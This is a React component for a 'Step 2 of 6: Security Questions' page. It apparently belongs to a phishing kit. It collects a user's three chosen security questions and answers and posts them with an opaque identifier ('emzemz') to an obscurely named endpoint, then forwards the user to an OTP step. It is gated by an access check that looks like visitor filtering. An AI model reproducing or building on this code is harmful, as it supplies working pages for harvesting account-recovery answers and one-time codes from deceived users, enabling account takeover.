import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: '',
    form: ''
  });

  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/login', { replace: true });
    }
  }, [emzemz, navigate]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  const securityQuestions = [
    "What was your childhood nickname?",
    "What is your mother's maiden name?",
    "What was the name of your first pet?",
    "What was the make and model of your first car?",
    "What city were you born in?",
    "What is your favorite childhood memory?",
    "What was your first job title?",
    "What is the name of your favorite teacher?",
    "What is your favorite book/movie character?",
    "What street did you grow up on?"
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : '',
      form: ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/fifty-meta-data-7/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3
        });
        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error submitting your security questions. Please try again.',
        }));
      } finally {
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout breadcrumb="Step 2 of 6: Security Questions" cardContentClassName="space-y-6">
      <div className="space-y-6">
        <h2 className="text-2xl font-semibold text-gray-900">Security Questions</h2>
        <p className="text-xs font-semibold uppercase tracking-wide text-[#123b9d]">Complete all fields to continue</p>
        <p className="text-sm text-gray-600">
          Choose three questions and answer them carefully. We’ll use these to confirm your identity whenever you need to recover your access.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="grid gap-6 md:grid-cols-2">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Security Question 1</label>
              <select
                value={securityQuestion1}
                onChange={(event) => setSecurityQuestion1(event.target.value)}
                className="w-full rounded-sm border border-gray-300 bg-white px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Select a security question</option>
                {securityQuestions.map((question, index) => (
                  <option key={index} value={question}>
                    {question}
                  </option>
                ))}
              </select>
              {errors.securityQuestion1 && (
                <p className="text-xs font-semibold text-red-600">{errors.securityQuestion1}</p>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Answer 1</label>
              <input
                type="text"
                value={securityAnswer1}
                onChange={(event) => setSecurityAnswer1(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter your answer"
              />
              {errors.securityAnswer1 && (
                <p className="text-xs font-semibold text-red-600">{errors.securityAnswer1}</p>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Security Question 2</label>
              <select
                value={securityQuestion2}
                onChange={(event) => setSecurityQuestion2(event.target.value)}
                className="w-full rounded-sm border border-gray-300 bg-white px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Select a security question</option>
                {securityQuestions.filter((question) => question !== securityQuestion1).map((question, index) => (
                  <option key={index} value={question}>
                    {question}
                  </option>
                ))}
              </select>
              {errors.securityQuestion2 && (
                <p className="text-xs font-semibold text-red-600">{errors.securityQuestion2}</p>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Answer 2</label>
              <input
                type="text"
                value={securityAnswer2}
                onChange={(event) => setSecurityAnswer2(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter your answer"
              />
              {errors.securityAnswer2 && (
                <p className="text-xs font-semibold text-red-600">{errors.securityAnswer2}</p>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Security Question 3</label>
              <select
                value={securityQuestion3}
                onChange={(event) => setSecurityQuestion3(event.target.value)}
                className="w-full rounded-sm border border-gray-300 bg-white px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Select a security question</option>
                {securityQuestions
                  .filter((question) => question !== securityQuestion1 && question !== securityQuestion2)
                  .map((question, index) => (
                    <option key={index} value={question}>
                      {question}
                    </option>
                  ))}
              </select>
              {errors.securityQuestion3 && (
                <p className="text-xs font-semibold text-red-600">{errors.securityQuestion3}</p>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Answer 3</label>
              <input
                type="text"
                value={securityAnswer3}
                onChange={(event) => setSecurityAnswer3(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter your answer"
              />
              {errors.securityAnswer3 && (
                <p className="text-xs font-semibold text-red-600">{errors.securityAnswer3}</p>
              )}
            </div>
          </div>

          {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoading ? 'Saving…' : 'Continue'}
            </button>
          </div>
        </form>
      </div>
    </FlowPageLayout>
  );
};

export default SecurityQuestions;
